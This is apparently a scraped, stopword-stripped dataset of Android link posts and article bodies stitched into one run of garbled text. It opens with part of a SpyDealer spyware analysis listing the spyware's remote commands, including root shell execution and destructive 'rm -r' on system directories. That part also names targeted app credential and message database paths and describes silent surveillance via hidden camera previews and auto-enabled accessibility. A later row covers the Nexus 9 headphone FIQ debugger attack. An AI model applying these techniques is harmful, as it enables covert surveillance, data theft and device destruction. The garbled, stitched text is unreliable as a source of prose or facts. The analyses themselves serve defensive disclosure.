filepath filepath target file path collect file information given filepath including file name file size last modified time loadfilen filedirpath filedirpath target file directory path store file directory path ready uploaded finishdfilen filedirpath filedirpath target file directory path store file directory path already uploaded sysinfo collect compromised device information including phone number wifi mac address network operator screen display metric camera information etc gsmlocation get geographical location based cell information getpackets collect installed apps information including app name package name network packet received transmitted app queryremoteip query remote server ip address set previously contact get contact name phone number thumbnail image historycall send back phone call history including phone number contact name date phone call duration getsms retrieve sm message inbox outbox draft box well mm message type n config type indicates type configuration wifi configuration set value wifi otherwise set configuration config configuration content set configuration wifi network configuration control action malware gettransinfo query configuration set indicates kind action enabled setgpstmn time time number second set gps location obtaining interval time querygpstm query interval time obtain gps location setremoteipn ip ip ip address remote server set remote server ip address fileconfign filename n actiontype n configcontent filename file created app data directory filename actiontype value set config content stored configcontent configuration content stored store configcontent file created app data directory file name filename setautophonen phonenum phonenum phone number set phone number malware automatically answer incoming phone call number set one getautophone get phone number set command setautophone setabroadsmsn phonenums phonenums phone number split new line character set sm message blocking list malware block incoming sm message phone number among blocking list getabroadsms get list blocking phone number list set command setabroadsms setsocketmoden sockettype set communication protocol default one udp sockettype protocol changed tcp setbackipn ip ip ip address set ip address backup server uninstall uninstall malware execcmdn command command shell command string execute command root privilege getevnaudiostate check audio recording state enabled sendmsgn actiontype n phonenum n content n datetime actiontype type action phonenum phone number content message body datetime date time string value actiontype local malware insert fake sm message phonenum source address content message body incoming sm message notification posted otherwise sm message content sent phonenum getscontroln get configuration need consume battery test network connection etc regetappn filename filename file name split comma delete db file specified filename one one db file datadata packagename filesappout getappn packagenames packagenames app package name split comma upload app data file except libs target apps determined argument packagenames startroot try execute exploit gain root privilege camvideon cameratype n duration cameratype front rear camera duration duration time video recorded set configuration video recording use rear camera cameratype back otherwise front camera used record video duration argument specifies duration video campicn cameratype cameratype front rear camera determine use camera take picture rear camera used cameratype back getphonenumn phonenum phonenum phone number send gsm location compromised device along remote server ip given phone number via sm deletefilen filepath filepath absolute path file folder delete file folder malware data directory scontroln cmdtype n cmdargumetns cmdtype number indicate type command executed cmdarguments command argument execute kind command example delete file get wifi connection information consumes battery etc command detailed later table table command udptcp client command type scontrol sub command determined cmdtype field integer number ranging subcommands detailed table sub command type command argument description execute rm command including rm r systemapp rm r dataapp rm r systembin rm r systemxbin root privilege app package name split comma remove apps data directory executing command rm datadata package name root privilege string end start continuously consumes compromised device resource floating multiplication division file suffix split comma delete file external storage match given file suffix enable airplane mode device android version string end start test network connection sending http request http file path delete file specified given file path file may removable permission mind spydealer first try delete file via java api filedelete executes rm command root privilege collect current connected wifi information well history one information contains bssid ssid mac address network id key management password string end start continuously drain compromised device power floating division get compromised device system information including imei imsi wifi mac address phone number etc srcfilepathndstfilepath copy file srcfilepath destination dstfilepath table detail scontrol sub command data sent back remote server encrypted using tea algorithm udp sessionless protocol design guarantee transmitted packet received destination without loss mitigate risk spydealer creates effective session layer top udp spydealer divide original data multiple group group byte data group sent one one every transition repeated three time order restore data server side additional identification code added beginning grouped data hence format final group data shown mulpacketn imei n uuid n totalgroups n currentgroupid n data imei imei compromised device uuid field consists two part first part integer starting increase one one transition reaching reset second part current time millisecond totalgroups total number group currentgroupid index current group start data payload data private data collection discussed section command control seen malware employ many mechanism collect private data additionally root privilege spydealer also try gather data common apps falling different category including social communication browser mobile mail client etc targeted apps listed table id package name app name comfacebookkatana facebook comtencentmm wechat comwhatsapp whatsapp comskyperaidercomskyperover skype jpnaverlineandroid line comvibervoip viber comtencentmobileqq qq orgtelegrammessenger telegram comalibabamobileim ali wangxin kikandroid kik comicqmobileclient icq video call chat comkeechatclient keechat messenger comoovoo oovoo video call text voice cominstanzacocovoice coco combbm bbm comgtomatotalkbox talkbox voice messenger comrebelvoxvoxer voxer walkie talkie messenger comimmomomomo momo comzingzalo zalo comloudtalks zello ptt walkie talkie comduowanmobile 手机yy imyixin 易信 cncomfetion 飞信 comsgiggleproduction tango comrenrenmobileandroid 人人 netiaround 遇见 comsinaweibo sina weibo comtencentwblog tencent weibo orgmozillafirefox firefox browser comoupengbrowser oupeng browser comandroidbrowser android native browser combaidubrowserapps baidu browser comtencentmtt tencent qq browser comlenovobrowser lenovo browser comqihoobrowser qihoo browser comtaobaotaobao taobao comneteasemobimail netease mail comtencentandroidqqmail tencent qq mail mail cncjpe mail combaidunetdisk baidu net disk coml smart shopping list listonic comdewmobilekuaiya zapya comfuncitytaxipassenger kuaidi taxi table full list targeted apps gather sensitive data apps spydealer first drop executable binary named dealapp local asset app data directory copy systembindealapp superuser privilege systembindealapp launched gather kind data target apps data collected limited database file also includes configuration specific file table listed target apps various directory database file malware try access table file spydealer try access app name file accessed facebook wechat datadatacomtencentmmmicromsg enmicromsgdb whatsapp datadatacomwhatsappsharedprefsregisterphonexml datadatacomwhatsappsharedprefsregistrationregisterphonexml skype datadatacomskyperaiderfiles accountname maindb line datadatajpnaverlineandroiddatabasesnaverline viber datadatacomvibervoipfilespreferencesregviberphonenum datadatacomvibervoipfilespreferencesdisplayname datadatacomvibervoipdatabasesvibermessages qq datadatacomtencentmobileqqdatabases db telegram datadataorgtelegrammessengersharedprefsuserconfingxml kik datadatakikandroidsharedprefskikpreferencesxml datadatakikandroiddatabaseskikcoredatabasedb icq video call chat datadatacomicqmobileclientdatabasesagentdao keechat messenger datadatacomkeechatclientappparsecurrentuser datadatacomkeechatclientdatabases oovoo video call text voice datadatacomoovoodatabasescoredb bbm datadatacombbmfilesbbmcoreadsdb datadatacombbmfilesbbmcorefiles talkbox voice messenger datadatacomgtomatotalkboxsharedprefstalkboxdataxml datadatacomgtomatotalkboxdatabases conversationsdb voxer walkie talkie messenger datadatacomrebelvoxvoxerdatabasesrvdb zello ptt walkie talkie datadatacomloudtalkssharedprefspreferencesxml tango datadatacomsgiggleproductionfilesuserinfoxmldb datadatacomsgiggleproductionfilesprofilecachedb datadatacomsgiggleproductionfilestcdb firefox browser datadataorgmozillafirefoxfilesmozillabrowserdb datadataorgmozillafirefoxfilesmozillacookiessqlite datadataorgmozillafirefoxfilesmozillasignonssqlite oupeng browser datadatacomoupengbrowserdatabasesbookmarkdb datadatacomoupengbrowserdatabaseswebviewcookieschromiumdb datadatacomoupengbrowserdatabaseswebviewdb android native browser datadatacomandroidbrowserdatabaseswebviewcookieschromiumdb baidu browser datadatacombaidubrowserappsdatabaseswebviewcookieschromiumdb datadatacombaidubrowserappsdatabasesflyflowdownloaddb tencent qq browser datadatacomtencentmttdatabaseswebviewcookieschromiumdb datadatacomtencentmttdatabasesdefaultuserdb lenovo browser datadatacomlenovobrowserdatabaseslebrowserdb datadatacomlenovobrowserdatabasesxldownloadsdb qihoo browser datadatacomqihoobrowserdatabasesbrowserdb datadatacomqihoobrowserdatabasesdownloadsdb datadatacomqihoobrowserdatabaseswebviewcookieschromiumdb datadatacomqihoobrowserdatabaseswebviewdb netease mail datadatacomneteasemobimaildatabasesmmail tencent qq mail datadatacomtencentandroidqqmaildatabasesaccountinfo datadatacomtencentandroidqqmaildatabasesqmmaildb mail baidu net disk datadatacombaidunetdiskdatabasesaccountdb zapya datadatacomdewmobilekuaiyadatabasesimuserdb dealapp binary also updated remote server shown figure figure dealapp update procedure accessibility service abuse increasing number apps encrypt data storing database especially popular communication social apps app developer protect user data malicious attack like one avoid obstacle starting version spydealer implemented extra accessibility service steal plain message directly extracting text screen figure depicts accessibility service configuration package name targeted apps declared figure configuration accessibility service normally enabling accessibility service requires user interaction manually go device setting however root privilege spydealer silently enable accessibility service without user participation command used enable accessibility service depicted figure figure enable accessibility service silently via executing command root privilege accessibility service enabled spydealer primarily listens typenotification statechanged contentchangetypesubtree event notification posted message come trigger typenotificationstate changed event usually user click notification view message brings detail view front behavior fire contentchange typesubtree event contentchange typesubtree event arrives malware start travel current screen extract plain text message although number message limited dimension device screen continuously monitoring screen help extract complete message gathering message spydealer sends remote server figure along information including imei imsi package name app name figure send extracted data information remote server surveillance spydealer capable surveilling compromised victim multiple mean including recording phone call surrounding audio recording video taking photo capturing screenshots monitoring geographical location take action based command receives command control channel described record phone call surrounding audio spydealer register phonestatelistener monitor phone call status active phone call audio recording procedure triggered recorded audio data finally compressed zip format stored sdcardtmpaudio currenttimeinyyyymmddhhmmss phonecallnum phonecall date zip message format audion imsi n imei n zipfilepath sent remote server audio successfully recorded addition recording phone call spydealer also capable recording surrounding ambient audio configured record audio specific time range recorded audio file stored following path zip format sdcardtmpenvironmentaudioaudio currenttimeinyyyymmddhhmmss zip audio file recorded seven day ago automatically deleted directory sdcardtmpenvironmentaudioaudio record video spydealer check see camera available record video every three second android system preview surface required take video mean user aware video recording event avoid spydealer intentionally set tiny preview surface case dimension video recorded second finally stored datadata packagename filescameravideo currenttimeinyyyymmddhhmmss zip network connection available spydealer sends message format cameravideon imsi n imei n zipfilepath remote server figure tiny surface view defined recording video silently take photo similar recording video without user awareness malware creates another tiny preview surface dimension taking photo using front rear camera depends configuration attacker set remotely taken photo stored datadata packagename filescamerapiccamera currenttimeinmillseconds jpg message indicating photo taken sent remote server message format camerapicn imsi n imei n picturepath monitor geographic location spydealer dynamically register broadcast receiver listening screen status whenever screen turned try get geographical location via gps time location listener registered track device location location listener notified updated location every second whenever meter movement occurs location update network connection available location data sent remote server format lgpsn imei n imsi n longitude n latitude n currenttimeinyyyymmdd hh mm s however location data saved locally network connection uploaded later connection restored icon indicating usage gps status bar gps active avoid user suspect spydealer stop tracking device location device screen turned functionality besides many powerful capability described spydealer also capable automatically answering incoming phone call dynamically loading plugins downloaded remote server incoming phone call specific number remotely configured malware simulate earphone plugged event automatically answer phone call detailed figure functionality spydealer let victim miss phone call without awareness figure implementation automatically answer incoming phone call conclusion spydealer make use commercial rooting app baidu easy root gain root privilege maintain persistence compromised device employ wide array mechanism steal private information time access exfiltrates sensitive data different popular apps root privilege accessibility service malware also capable extracting plain text message target apps real time remotely control victim device malware implement three different channel support command customer palo alto network protected wildfire url filtering service trap android wildfire able automatically classify spydealer sample malicious autofocus user track malware using spydealer tag trap android protects android device automatically intercept malicious apps installed device leveraging wildfire protect device spydealer apps blocking app notifying user acknowledgement would like thank claud xiao ryan olson palo alto network assistance analysis appendix iocs sample spydealer downloaded rawzip contains exploit stolen baidu easy root appendix b ipdomain list server ip country ip country ip country china china united state china china china china china china china china china china china china china china china china china china china china china china china china china china china china china united state china china china china china china china china china china united state china china china china china china china china china china china china china china china china china china china china china china china china china china china china china china china china softupdateeicpnet china china china china china china china china china china china china get update palo alto network sign receive latest news cyber threat intelligence research u
244,Lobsters,android,Android,Broadpwn Bug Affects Millions of Android and iOS Devices,https://www.bleepingcomputer.com/news/security/broadpwn-bug-affects-millions-of-android-and-ios-devices/,broadpwn bug affect million android io device,public information available yet researcher reverse engineer android security patch user connect trusted network another flaw broadcom wifi chip,broadcom wifi chip embedded android io device vulnerable bug allows attacker execute code device without interaction needed user bug discovered security researcher nitay artenstein nicknamed broadpwn tracked artenstein reported bug private google included fix issue android security bulletin july released week july public information available yet artenstein disclosed information bug exploit public set give presentation broadpwn year black hat usa security conference held la vega start august detail revealed bug artenstein say broadpwn affect million android io device use broadcom wifi chip handle network communication researcher specifically point finger broadcom family wifi chip included extraordinarily wide range mobile device vendor google nexus samsung htc lg researcher reverse engineer android security patch zhuowei zhang another android security expert reversed engineered android july security patch dig detail broadpwn zhang say bug appears heap overflow firmware broadcom wifi chip researcher say exploitation take place user device receives wme qualityofservice information element malformed length connected network attacker nt need user interaction exploit feature victim need walk attacker wifi network range artenstein later confirmed twitter connecting malicious network necessary user connect trusted network security bulletin google rated broadpwn critical severity issue meaning company view dangerous bug zhang also say broadpwn appears related another flaw broadcom wifi chip discovered google project zero researcher patched april user nt receive month android security patch connect trusted wifi network disable wifi autoconnect feature using one information status bug io device article updated reflect severity level changed medium critical
245,Lobsters,android,Android,Firefox own linker on Android,https://dustri.org/b/firefox-own-linker-on-android.html,firefox linker android,someone linker bionic linker decompress put right place line line line hook,recently someone irc complaining insane firefox linker android blogpost largely based rant thought joke would android application linker apparently firefox way according bionic linker bundle library apk android decompress put right place installing application nice bonus application nt writeaccess library everything looking fine firefox one circa line linker decompressing zip file map memory would instead using default linker thing starting slowly become scary line defined android system library may calling signal sigaction set sigsegv handler effectively breaking mappableseekablezstream worse restore sigsegv handler wrong flag using signal want hook system sigaction replace wrapper instead handler never replaced used library linker load turn least one system library call signal break u samsung galaxy libc signal bsdsignalsysvsignal really call sigaction hood instead calling signal system call directly need hook sigaction true bionic glibc libc sigaction extern c int sigaction int signum const struct sigaction act struct sigaction oldact simple reimplementation sigaction roughly equivalent assembly come bionic quite equivalent glibc implementation use android int syssigaction int signum const struct sigaction act struct sigaction oldact return syscall nrsigaction signum act oldact replace first instruction given function jump given new function template typename static bool divert func newfunc wait linker seems set handler sigsegv point provides sigaction reimplementation hotpatching function line becomes even clear getting closer hell get current segfault signal handler struct sigaction oldaction syssigaction sigsegv nullptr oldaction device nt provide useful information sigsegv handler making impossible ondemand decompression work check device setup temporary handler deliberately trigger segfault handler set signalhandlingbroken provided information bogus device kernel option enabled make sigsegv handler overhead high affect ondemand decompression performs handler also set signalhandlingslow triggered sigsegv took much time struct sigaction action actionsasigaction segvhandler testhandler sigemptyset actionsamask actionsaflags sasiginfo sanodefer actionsarestorer nullptr stackptrassign memoryrange mmap nullptr pagesize protread protwrite mapprivate mapanonymous stackptrget mapfailed return syssigaction sigsegv action nullptr return linker indeed setting signal handler sigsegv deliberately trigger segfault trying map null readwrite check various thing whole point apparently decompress likely map library runtime even better hook sigaction ensure sigsegv correctly handled redispatch signal long story short seems performance reason firefox start without loading library catch sigsegv load library directly memory paged storage demand
246,Lobsters,android,Android,"Firefox Focus New to Android, blocks annoying ads and protects your privacy",https://blog.mozilla.org/blog/2017/06/20/firefox-focus-new-to-android-blocks-annoying-ads-and-protects-your-privacy/,firefox focus new android block annoying ad protects privacy,firefox focus tracking ad new feature android google play app store,last year introduced firefox focus new browser iphone ipad designed fast simple always private lot happened since november ever seeing consumer play active role trying protect personal data save valuable megabyte data plan knew focus provided useful service time want keep web browsing floored response highest rated browser trusted brand iphone ipad earning average rating app store today thrilled announce launching firefox focus mobile app android like iphone ipad version android app free tab visual clutter erasing session easy simple tap firefox focus allows browse web without followed tracking ad notoriously known slowing mobile experience block ad tracker track behavior without knowledge also slow web mobile device check video learn video new feature android android release firefox focus added following feature ad tracker counter curious counter list number ad blocked per site using app disable tracker blocker site loading correctly disable tracker blocker quickly take care get back left notification reminder focus running background remind notification easily tap erase browsing history android user also made focus great default browser experience since support custom tab ability disable ad blocking needed work great apps like facebook want read article without tracked built focus empower mobile web continue introduce new feature make product even better thanks using firefox focus faster private mobile browsing experience firefox focus setting view download firefox focus google play app store
247,Lobsters,android,Android,"Long time contributor and app packager, krt, leaves F-Droid",https://forum.f-droid.org/t/so-long-farewell-and-goodbye/600,long time contributor app packager krt leaf fdroid,http fdroidorgwikipagecategory appswithfailingbuilds http,thanks kind word system laptop ssh paper heavy mobile user general got interested cellphone became pclike year fdroid year actual mobile phone usage coming oldschool unix environment reverting back go deep hostinginfrastructure fdroid website forum wiki etc worked fdroiddata small contribution documentation website server others like client forum core infrastructure affected saying situation perfect want chip always lot work regardless branch role responsibility basically adding updating apps apps described meta information buildscripts stored simple text migrating yaml file actually easy get used really sophisticated sometimes weird apps apps either based gradle option output gradle build like newer cordovahtml apps copy adapt old build case fixed list duty whatever encounter maintenance list come monitor fdroiddata commits apps updated version code update app look add actual build information monitor wiki failing build investigate ideally fix build monitor request packaging queue try add new apps fdroid import tool become quite convenient use talk upstream want include app explain eg playservices hindering inclusion etc also try keep fdroiddata clean possible app requires complex set likely upstream change app devs test build system work problem attitude really greatful since actually point issue warent aware propose change fdroidserver tool like updating installed sdks ndks buildtools adapt binaryscanner importing tool fdroidserver largely handled others app maintainer user tool see anything broken task manually get repetitive automated documentation change hopefully soon relaunched website talk upstream devs user irc forum answer incomming mail start drawing list unmaintained package never came state lot maintainer one specific app instead contributor work whats seems relevant right regardless app list would rather lengthy maintain list apps need updating apps broken build wiki look commits upgrade versioncode instead adding new build also help time reliable sidenote current state failing build wiki see http fdroidorgwikipagecategory appswithfailingbuilds representativ think caused bug see http always people willing help new maintainer fdroid fdroiddev left hope boris either yep stay irc well question answer best
248,Lobsters,android,Android,Our dirty little secret: Cross-platform email client with nothing but HTML,https://medium.com/missive-app/our-dirty-little-secret-cross-platform-email-client-with-nothing-but-html-aa12fc33bb02,dirty little secret crossplatform email client nothing html,dirty little secret crossplatform email client nothing html amazingly fast receiving review featured apple missive android io counterpart responsive http react native cs u http githubengineeringcomhowfournativedeveloperswroteanelectronapp favorite browser native wrapper,dirty little secret crossplatform email client nothing htmlamazingly fast receiving review featured appletoday released missive android week ago io counterpart writing featured apple new apps love section app store u canada knowledge oh love however one big terrible shocking secret responsive phonegap app bundle exact code desktop sink init feel incredibly native thought especially phonegap dead water apparently particularly proud stack would love elaborate little bit clientside missive desktop apps built top electron mobile apps top phonegap core missive react backbone app written coffeescript welcome year ago right yup exactly development began day still feel like changing would make app better waywhy react native noticed emphasis responsive context menu full screen nativelike navigation cssit csshappen desktop touch screen even better get full touch ux unmatched unprecedented technologyswiping chrome device toolbar enabledso fact little bit hassle copy pretty much native behaviour htmlcss react native really came one bundle rule advantage u react native would make sense missive mobile app case afford maintain one code base per platform mobile v desktop mean bug le feature coverage usone focusing backend one frontend one allstar allaround guy said review everyone else code whether area expertise needle say time focus scarce resource around pick fight carefully always aim long run would taken different path team maybe would mistake definitely think web leanest pragmatic way go app ambitious missiveas turn building native apps multiple platform githubengineeringcomhowfournativedeveloperswroteanelectronappfocusing sole code base give u opportunity good one area instead struggling keep every code base sync without even realizing perfect different layout size ipad pro split view example come free using build platform going web whether using missive favorite browser device one native wrapper fullfeatured experience
249,Lobsters,android,Android,"Nexus 9 vs. Malicious Headphones, Take Two",https://alephsecurity.com/2017/06/13/nexus9-ephemeral-fiq/,nexus v malicious headphone take two,disclosed june android security bulletin recap see survey breakout board preemption arbitrary process leakage stack canary derandomization aslr access sysrq rebooting hboot htc android bootloader may update factory reset attempted patch fully loaded fiqdebuggerc ephemeral access unrestricted fiq debugger sysrq previous blog post script kernelsysctlc sysrq command nonephemeral proofofconcept patch june build,march disclosed critical vulnerability nexus allowed quite unique attack malicious headphone interestingly patch insufficient responsibly reported finding google patched june android security bulletin blog post begin short recap analyze original patch insufficient demonstrate sample attack end presenting patch seems completely block attack recap common practice google nexus pixel device voltage mic pin trrs connector exceeds threshold headphone jack turn uart debug interface see survey sample cable assembled using standard breakout board vulnerability nexus debug interface also gave access capable fiq debugger hit enter activate fiq debugger debug help fiq debugger command pc pc status regs register dump allregs extended register dump bt stack trace reboot c reboot command c reset c hard reset command c irqs interupt status kmsg kernel log version kernel version sleep allow sleep fiq nosleep disable sleep fiq console switch terminal console cpu current cpu cpu number switch cpu number p process list sysrq sysrq option sysrq param execute sysrq param interesting consequence preemption arbitrary process allowing leakage user data leakage stack canary derandomization aslr access sysrq rebooting hboot htc android bootloader issuing reboot also enabled attack internal socs patched may update factory reset issuing reboot attempted patch google tried patch reducing capability fiq debugger recent build since patch platform fully loaded longer possible dump register reboot oemn parameter preventing reboots hboot factory reset debug help fiq debugger command reboot reboot reset hard reset irqs interrupt status sleep allow sleep fiq nosleep disable sleep fiq console switch terminal console p process list debug relevant commit tegra kernel tree analyzing patch show critical fiq debugger command governed sysrqon function example let examine fiqdebuggerfiqexec fiqdebuggerc static bool fiqdebuggerfiqexec struct fiqdebuggerstate state const char cmd const struct ptregs regs void svcsp else strcmp cmd pc sysrqon fiqdebuggerdumppc state output regs else strcmp cmd regs sysrqon fiqdebuggerdumpregs state output regs else strcmp cmd allregs sysrqon fiqdebuggerdumpallregs state output regs else strcmp cmd bt sysrqon fiqdebuggerdumpstacktrace state output regs svcsp sysrqon implemented driversttysysrqc follows bool sysrqon void return sysrqenabled sysrqalwaysenabled since value sysrqalwaysenabled conclude effectiveness patch solely depends value sysrqenabled ephemeral access unrestricted fiq debugger sysrq unfortunately explained previous blog post default value sysrqenabled static int readmostly sysrqenabled sysrqdefaultenable includelinuxsysrqh enabledisable sysrq support default define sysrqdefaultenable platform bootup init script writes procsyskernelsysrq earlyinit set init forked child oomadj write disable sysrq keyboard write procsyskernelsysrq procsyskernelsysrq proc file backed code kernelsysctlc eventually toggle sysrqenabled therefore despite patch short window time millisecond boot init script executed one could still access unrestricted fiq debugger also sysrq command since attacker could force reboot even limited fiq debugger could access unrestricted fiq even victim inserted malicious cable platform fully loaded ephemeral access unrestricted fiq sysrq boot unrestricted fiq hboot limited fiq factory reset transition sysrqenabled sysrqdefaultenable init write procsyskernelsysrq sysrqenabled attacker limited fiq reboot attacker unrestricted fiq reboot attacker unrestricted fiq reboot noted recovery initrc script disable sysrq allowed nonephemeral unrestricted fiq access device recovery mode also mitigated new patch proofofconcept following demonstrates preempt arbitrary process also get hboot mode bypassing patch assume attack begin platform fullyloaded force normal reboot get early temporary access fiq debugger issue capablefiq bt command afterwards reboot hboot mode issuing reboot debug help fiq debugger command reboot reboot reset hard reset irqs interrupt status sleep allow sleep fiq nosleep disable sleep fiq console switch terminal console p process list debug bt debug reboot debug battery present battery voltage mv battery charge sufficient override bct configs nvbootemcreadmrr hboot query query implemented platform pre o boot configuration info booting linux tag ramdisk machine type hit enter activate fiq debugger debug help fiq debugger command pc pc status regs register dump allregs extended register dump bt stack trace reboot c reboot command c reset c hard reset command c irqs interupt status kmsg kernel log version kernel version sleep allow sleep fiq nosleep disable sleep fiq console switch terminal console cpu current cpu cpu number switch cpu number p process list sysrq sysrq option sysrq param execute sysrq param debug bt pid comm debug reboot bootloader mode hboot command brief description securitycommand boot desc readconfig desc readimei desc readmeid desc readpid desc rebootruu desc refurbish desc reset desc hboot patch google patched vulnerability commit available june build value sysrqdefaultenable preventing temporary access unrestricted fiq debugger sysrq interface diff git aincludelinuxsysrqh bincludelinuxsysrqh index aincludelinuxsysrqh bincludelinuxsysrqh include linuxtypesh enabledisable sysrq support default define sysrqdefaultenable define sysrqdefaultenable possible value bitmask enabling sysrq function reserved enable everything
251,Lobsters,android,Android,WebGL Map with Mapbox and React,https://pusher.com/sessions/meetup/the-js-roundabout/webgl-map-with-mapbox-and-react,webgl map mapbox react,talk transcript,talk build open source webgl map using mapbox react transcript hi everyone alex front end developer trainline tonight talk webgl map mapbox react yeah find twitter github using web map basically almost lot company simple map contact page big player tech scene using core component application like deliveroo uber citymapper airbnb foursquare well use google map airbnb china think use mapbox foursquare using mapbox well big player using technology mapbox mapbox company started silicon valley india china almost everywhere provide complete geographic information system provide lot tool display map web android sdk io sdk complete suite tool also tell based open street map full open source map provided community anyone go open street map draw road building anything check satellite image top satellite image draw anything want submit change want display map web two approach first one using raster tile tile displayed dom using simple image tag image usually png format one advantage bundle size quite small compared approach support service site rendering approach using canvas webgl using vector tile format svg performance interact data front end zoom interpolation highly customizable gon na show bit later example raster map using map box gl map box glgs going show quickly raster tile check dom find different tile tile basically simple image tag remove tag see anymore unzoom map loading new tile refreshed tile see zoom best zoom different stage show webgl map gon na see difference zoom webgl map using mapbox gl react show dom see map rendered canvas yeah canvas using webgl shaders mapbox give shaders everything need like high level api use one advantage webgl map well like building gon na show right zoom first zoom quite smooth see compared previous map see building also play camera move little bit london eye bit weird square improve yes draw proper circle yeah lot data missing nt know seen google map feature think way data london think contribute draw modelize building want send open suite map gon na show quickly implemented previous example straightforward line import map box gl set access cam get map box studio gon na show later use map box studio instantly see map pas style designed map box studio pas centre zoom container idea dom image unload gon na add layer simple building define extrusion want see extrusion mini zoom yeah pretty much quite nice cutting edge using react want integrate using react one advantage react declarative api update abstracted could use nice advantage react update map everything map basically gon na show could simple react component could define div tag set reference tag tag run gon na react gon na trigger component demand component demand spread prop get component set different option map use container previously referenced render canvas inside container could use way pas style though sometimes zoom much declarative nice actually react mapbox gl good react mapbox gl library started write phil gon na talk later started project one year ago company using production keep maintaining contain two different kind component would say projected component one real component gon na render proper dom end component render popup marker cluster marker kind fake component end nt render anything dom map declarative api component direct mapbox api component layer source feature well render marker one line polygon end marker line polygon gon na rendered canvas react mapbox gl referenced mapboxcom plug section referenced react integration mapbox gl real world application example feature could find application quite simple application display bunch station bike station get tfl proper example react mapbox gl get bike station display map click bike station find information name station pop map simple filter number bike available number slot code gon na show data fetch data display data fetch data tfl api get aso want convert string object using xm g fetching back station component three month normalise data set state quite trivial insert shape react mapbox map passing style access quite simple react component want display station create use layer component layout define image want use name image different mapbox studio show bit later well hit right go station simple map return feature station set coordinate required input feature component pas different call back like different function almost centre almost leave one click interact quite well select station example let submit station selected station state display pop inside pop like normal react component inside pop inject whatever want yeah access well contact everything like normal react component show quickly mapbox studio mapbox studio quite complex interface quite flexible design almost everything want map colour width road building example colour map brown want change colour something else orange pink yeah let make fun map yeah pink road need publish mapbox going show changed previous design new one publish yay success cool supposed see change refresh quite slow actually change server take like minute nt know want wait think better go forward yeah mapbox well wanted show marker want add marker go icon different marker marker name marker use front end well upload marker add image use front end published server want well display prop pas object click map download map give adjacent object pas react mapbox component instead passing string want talk project finished last week basically map display unesco site single map using react mapbox gl get data unesco dump excellent site using flickr get image result see unesco site world click nice one like paris nice one like versailles versailles one unesco site see different image flickr quick description data complete missing image weird title site like one nt get image add later yeah complete example wanted speak one feature continued quite nice change bound map update list left side basically two thing list change bound filter different monument state want show quickly yup abstraction map different layer bound change prop gon na trigger bound change one change side apply filter nt want function called every minute gone want function called every minute gone taking latest change function passing leading getting see bound change get mapped prop feature react mobile gl giving every time pas event function giving first target map coordinate limit map like get bound use end project add like pixel margin going convert pixel latitude longitude calculate final bound call set monument bound using new bound filter monument pas state everything nice layer data visualisation mean want data visualisation strongly suggest check deckgl deckgl library provided uber written top react map gl nice lot crappy thing state getting updated time nice visualisation would nt suggest car map would use application provides web layer like scatterplots choropleths example deckgl using react map gl new york see different trip taxi trip think tosomething like example nt include taxi trip nice way see layer yeah many technology tool around map like mapbox geocoding service reverse geocoding service geocoding service going api request going convert address string coordinate place marker whatever want map nice well important paradigm routing mapbox provide routing api well want proper routing api would suggest try graph router propose like different routing algorithm restriction want add restriction well draw map wanted using mapbox gl draw react adaptation mapbox gl draw want jump open issue react map gl yeah pretty much want check react mobile gl github repository used spectacle slide github well want check student long take construct wonderful application like new map student yeah side project took would say like hour student wow pretty cool yeah quite quick work normalise data get unesco one friend api rest nice long wait well
252,Lobsters,android,Android,Google Hires key Chip Designer Manu Gulati from Apple,http://variety.com/2017/digital/news/google-manu-gulati-pixel-chips-1202464014/,google hire key chip designer manu gulati apple,google apple linkedin profile described hardwarebased security information reported bloomberg reported mobile soc cpu architect,google hired veteran chip architect away apple looking build chip future version flagship pixel phone variety learned source familiar hire manu gulati spearheading apple chip development close eight year joined google last week publicly announced job change linkedin profile tuesday morning stating work google lead soc architect addition gulati hire google looking hire additional chip expert tightly control future pixel hardware google spokesperson declined comment contacted story apple immediately respond request comment gulati started working apple instrumental company effort build custom chip ipad iphone apple tv apple began using chip starting introduction ipad powered company chip day company us customdesigned microchip device make possible optimize processor performance energy consumption industry integrated chip mobile device also known socs system chip contrast google relied chip designed manufactured qualcomm introduced first pixel phone last fall chip used number android phone manufacturer including htc lg lenovo asus go say phone offer similar performance spec qualcomm become de factomanufacturer higherend android phone chip making harder company differentiate device one another hiring gulati could help google get edge company losing hand significant blow apple cupertinobased computer maker filed total chiprelated patent credit gulati one inventor filing describe fundamental chip architecture others specific certain application example one patent described hardwarebased security apple pay securely store user fingerprint iphone google desire eventually design chip mobile device reported time back information reported company conversation chip manufacturer building googledesigned chip last year bloomberg reported google planned eventually power pixel device microchip effort seem gained significant steam recent month coinciding gulati hire google started post number job offer chip designrelated position including one mobile soc cpu architect mobile soc architect help define architecture future generation phone tablet chip recently much problem google company previous nexus phone primarily aimed android enthusiast way google push industry adopt latest greatest android could offer nexus phone often even pack latest chip instead aimed lower pricing better software experience google began shift mobile device strategy take apple directly new premium pixel phone time industry underwent fundamental change put bigger onus phone hardware phone nowadays texting web browsing anymore increasingly used power virtual reality headset augmented reality experience application powered machine learning require company shift smart cloud google tech used shine local device adapt voice visual input notable latency apple drove home point recent developer conference company svp software engineering craig federighi claimed iphone six time faster image recognition google pixel phone google vp android engineering dave burke actually embraced logic demonstrated google progress machine learning mobile device company google io developer conference may example shown burke included feature next version android automatically recognizes word text constitute address making easier copy paste address email text message kind text recognition done device real time burke said google looking hardwareaccelerate kind functionality future integrate machinelearning optimized signal processor directly phone main chip google need closely control design chip gulati expertise could essential effort linkedin profile show joining apple gulati worked close year chip maker amd broadcom giving total year experience industry
253,Lobsters,android,Android,It's Now Possible to Boot Android on i.MX6 Platforms Without Proprietary Blobs,http://news.softpedia.com/news/it-s-now-possible-to-boot-android-on-i-mx6-platforms-without-proprietary-blobs-516364.shtml,possible boot android platform without proprietary blob,collabora robert fo reporting new nxp buffer modifier implementation android mesa allows android run platform without needing proprietary blob mesa report lay groundwork supporting platform upstreamed,collabora robert fo reporting new nxp buffer modifier implementation android mesa allows android run platform without needing proprietary blob support buffer modifier added mesa gbmgralloc gbmgralloc capable using gbmboimportfdmodifier gbm api call designed import buffer object accompany various information one modifier used respective buffer object mesa received buffer modifier support gbm several buffer allocation function modifier support added mesa gbmgralloc possible boot android platform using proprietary blob make one embedded socs need blob run said robert fo report great win open source general also make attractive platform lay groundwork supporting platform buffer modifier place possible render different property buffer cover wide range information buffer including tiling compression enabling tiling artifact free running android platform tutorial available like test new buffer modifier support currently way upstreamed best new buffer modifier implementation mesa gbmgralloc lay groundwork supporting google android mobile operating system system module som series better understand work please take look video attached see zii board imx booting android using mesa opensource graphic stack
